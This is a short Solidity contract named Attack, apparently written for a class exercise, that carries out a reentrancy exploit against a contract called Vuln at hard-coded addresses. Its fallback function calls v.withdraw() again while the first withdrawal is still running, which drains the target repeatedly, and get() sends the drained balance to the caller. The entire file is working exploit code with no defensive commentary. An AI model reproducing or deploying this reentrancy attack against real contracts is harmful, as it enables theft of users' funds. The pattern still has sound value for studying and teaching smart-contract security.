pragma solidity ^0.6.0;
import "vuln.sol";

contract Attack {
    mapping(address => uint256) public amount;
    Vuln public v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018)); //call instance of Vuln
    // test  vuln address: 0x69CB37CeddBE7EbA8d23c330a34595a8CfCa7a23
    // class vuln address: 0x36A540E3A78084962B75E25877CfACf8846Be018

    uint public count = 0;

    function deposit() public payable {
        // Call vuln deposit and Increment their balance with whatever they pay
        v.deposit{value: msg.value}();
    }

    function get() public {
        msg.sender.send(address(this).balance);
        count = 0;
    }

    function withdraw() public {
        // Recursively call vuln through empty "" function withdraw to increase the amount of balance
        count += 1;
        v.withdraw();
    }

    fallback () external payable {
        count += 1;
        if(count > 2){
            count = 0;
        }
        else{
            v.withdraw();
        }
    }

}